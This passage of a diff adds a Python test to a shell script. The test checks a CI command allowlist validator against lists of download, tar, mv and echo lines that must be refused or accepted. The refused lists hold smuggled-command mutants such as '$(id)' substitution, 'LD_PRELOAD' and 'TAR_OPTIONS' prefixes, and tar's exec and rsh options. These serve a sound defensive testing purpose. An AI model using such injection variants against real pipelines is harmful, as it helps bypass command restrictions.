+             'mv -t d a', 'mv -f a b', 'mv a', 'mv a b c', 'mv -- a b', 'mv "$a" b', 'mv a "$b"', 'mv', 'mkdir -m 777 d', 'mkdir -p', 'mkdir -p -m 7 d',
+             'mkdir a b', 'mkdir --parents d', 'mkdir', 'mkdir -p a b', 'tar -xzf a.tgz', 'tar -xvf a', 'tar -tzf a', 'tar -x -f h:a.tgz', 'tar -x -z -f h:a.tgz -C out',
+             'tar -t -f h:a', "tar -x -f 'h:a'", 'tar -x -f "h:a"', 'tar --to-command=x -x -f a', 'tar -I x -x -f a', 'tar -x -f a --use-compress-program x',
+             'tar -x -f a -F s', 'tar -c -f a d', 'tar -x -f a -C', 'tar -x -f a -C d e', 'tar -x -f', 'tar -x -f -', 'tar -t -f a -C d', 'tar -z -x -f a',
+             'tar -f a -x', 'tar -x -v -f a', 'tar -x -f a --rsh-command x', 'tar -x -f a --checkpoint-action=exec=x', 'tar -x -f a b', 'tar x -f a',
+             'tar -x -j -f a', 'tar -x -f a -C -', 'tar -x -f a -C "$d"', 'tar -x -f "$f"', 'tar -x -z -f', 'tar -t -z -f a -C d', 'tar --extract -f a',
+             'ls -L d', 'ls -la', 'ls -l', 'ls --all', 'ls -- d', 'ls "$d"', 'ls -1', 'echo -e x', 'echo -n x', 'echo "$x"', 'echo -- x', 'echo curl',
+             'echo gh', 'echo git', 'echo wget', 'ls gh', 'mv curl b', "echo 'curl'", 'echo "a gh b"', 'echo gh-x', 'ls git/x', 'mkdir wget', 'test -f curl',
+             "echo '$x'", "echo '-n'", 'tar -x -f gh.tgz']
+for c in LOCAL_BAD:
+    REFUSED += [GHD + ' ; ' + c, A + ' ; ' + c, A + ' && ' + c]
+# R-4 the prefix's options off the list
+for o in ['--pattern-x a', '-X a', '--dir=dist', '-pa', '-p', '-p -D', '-A', '--clobber=1', '--skip-existing x', 'x', '-O -', '--output -', '-D "-x"',
+          '--allow-escape-sequences', '-h', '--help', '--pattern', '-p a -D', '--Dir d', '-d d', '-P a', '--archive=zip', '-Dd', '-O', '--skip', '--clob',
+          '-p "$(id)"', '-p $x', "-p '-R'", '-p a -R x', '--repository x', '--skip-existing -R x', '-p curl', '-D wget', '"-p" a', "'--clobber'",
+          '-p a b', '-- -p a', '-p=a']:
+    REFUSED.append(GHD + ' ' + o)
+# neighbour mutants, 10 per family, after the prefix and after curl
+FAMILIES = {
+    'separators': [' || ls', ' | ls', ' & ls', ' ;; ls', ' ;& ls', ' &&& ls', ' |& ls', ' ;| ls', ' & & ls', ' &; ls'],
+    'quoting': [' ; "ls"', " ; 'ls'", ' ; "l"s', ' ; l"s"', " ; l''s", ' ; ""ls', ' ; "echo" x', " ; 'tar' -x -f a", ' ; "sha256sum" -c a', ' ; e"cho" x'],
+    'continuation inside quotes': [' ; echo "a\\"', " ; echo 'a\\'", ' ; echo "a \\ b"', ' ; ls "d\\', ' ; echo "x', " ; echo 'x", ' ; echo "a" "b',
+                                   ' ; tar -x -f "a', ' ; echo "a\nb"', ' ; echo "a\tb"'],
+    'option spelling': [' ; tar -xf a', ' ; tar --extract -f a', ' ; tar -x --file a', ' ; tar -x -f=a', ' ; tar -x -fa', ' ; test -f=a', ' ; sha256sum --c a',
+                        ' ; sha256sum -c=a', ' ; mkdir --p d', ' ; mkdir -pv d', ' ; tar "-x" -f a', " ; test '-f' a", ' ; tar -X -f a', ' ; tar -x -F a'],
+    'env prefixes': [' ; A=b ls', ' ; TAR_OPTIONS=--to-command=x tar -x -f a', ' ; env ls', ' ; env -i ls', ' ; LD_PRELOAD=x ls', ' ; PATH=. ls',
+                     ' ; GH_REPO=x echo', ' ; HOME=- ls', ' ; a=1 b=2 ls', ' ; export A=b'],
+    'command substitution': [' ; echo $(id)', ' ; echo `id`', ' ; echo "$(id)"', ' ; echo "`id`"', ' ; echo <(id)', ' ; echo >(id)', ' ; echo ${x}',
+                             ' ; echo $((1))', ' ; echo "${x:-a}"', ' ; echo "$@"'],
+}
+for fam, ms in FAMILIES.items():
+    assert len(ms) >= 10, fam
+    for m in ms:
+        REFUSED += [GHD + m, GHD + ' -p a' + m, A + m]
+# R-5 controls that stay listed
+GH_LISTED = [GHD, GHD + ' -p manifest.json -D dist', GHD + ' --pattern "*.json" --dir dist', GHD + ' -D "$out"', GHD + ' --clobber', GHD + ' --skip-existing -O a.json',
+             GHD + ' -A tar.gz -D d', GHD + ' --pattern gh', GHD + ' -O a.json --clobber', GHD + ' --output a.json', GHD + ' --archive zip', GHD + ' -p a -p b',
+             GHD + " -p 'a b'", GHD + ' -p "${PAT}"', GHD + ' -p a.json && echo done', GHD + ' -D dist; ls dist', GHD + ' -p a.json; sha256sum -c a.sha256',
+             GHD + ' -p a.tgz ; test -s a.tgz && mkdir -p out && tar -x -z -f a.tgz -C out && ls out', GHD + ' -O a ; mv a b ; test -f b', GHD + ' ; echo ok',
+             GHD + ' ; mv "dist/$f" out', GHD + ' -p a.tgz && tar -t -z -f a.tgz', GHD + ' -p a.tgz && tar -x -f a.tgz', GHD + ' -p a.tgz && tar -t -f a.tgz',
+             GHD + ' && tar -x -f a.tgz -C out', GHD + ' ; test -e a ; mkdir d ; ls ; echo', GHD + ' -p x; ls', GHD + ' ; echo a=b "c d" \'e f\'',
+             GHD + ' ; test -f a && test -s a && test -e a', GHD + ' ; ls a b c']
+HOST_LISTED = [A, A + ' && sha256sum -c a.sha256', A + ' ; test -s a.tgz && mkdir -p out && tar -x -z -f a.tgz -C out && ls out', 'mkdir -p d && ' + A,
+               A + '; echo done', A + ' && mv a.tgz b.tgz', A + ' ; curl -fsS -o b https://h.example.dev/b', 'test -e a ; ' + A, A + ' && tar -t -f a.tgz',
+               A + ' ; echo "dist/$f"', A + '; ls']
+bad = []
+for line in REFUSED:
+    rs = line.startswith(GHD)
+    why = ac._unlisted(line, repo_self=rs) if rs else ac._unlisted(line)
+    if why is None:
+        bad.append(("listed, should be refused", line))
+    if not rs and not ac._follows_redirects(line):
+        bad.append(("an unlisted host line must count as following redirects", line))
+for line in GH_LISTED:
+    why = ac._unlisted(line, repo_self=True)
+    if why is not None:
+        bad.append(("repo:self control refused", line, why))
+for line in HOST_LISTED:
+    why = ac._unlisted(line)
+    if why is not None:
+        bad.append(("host control refused", line, why))
+assert not bad, bad[:40]
+print("PYC9: %d refused, %d controls" % (len(REFUSED), len(GH_LISTED) + len(HOST_LISTED)))
+PYC9
 # (3) the verifier line is matched against PHYSICAL lines of a literal-block run: (|, |-, |+) of exactly one step, never a parsed value (outbox 4a R1-R6)
 VC='cosign verify-blob --bundle b --certificate-identity x --certificate-oidc-issuer https://i out'
 vwcase() { # FILE TEXT EXPECTED-RC WHY
